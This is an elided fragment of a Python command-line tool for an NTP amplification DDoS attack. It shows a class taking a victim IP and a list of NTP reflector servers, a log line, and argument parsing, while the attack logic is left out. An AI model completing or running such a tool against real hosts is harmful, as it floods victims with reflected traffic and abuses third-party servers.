...
class NTPAmplificationAttack:
    ...
    def __init__(
        self, victim_ip: str, ntp_servers: list[str], count: int = 100, verbose: bool = False
    ):
        ...
        logger.info(
            f"Initialized NTP amplification attack: victim={victim_ip}, servers={len(ntp_servers)}"
        )
...
def parse_arguments() -> argparse.Namespace:
    ...
    parser.add_argument(
        "-n", "--ntp-servers", required=True, help="NTP server IPs (comma-separated)"
    )
